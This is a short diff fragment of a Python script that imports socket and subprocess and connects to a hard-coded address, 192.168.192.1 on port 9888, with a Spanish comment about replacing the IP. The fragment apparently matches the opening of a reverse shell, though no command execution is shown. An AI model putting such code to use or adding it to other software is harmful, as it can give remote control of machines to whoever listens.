@@ -2,7 +2,6 @@ import socket
 import subprocess
 def run():
  
-
  clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  clientsocket.connect(("192.168.192.1", 9888))  # Reemplaza con la IP del cliente
  
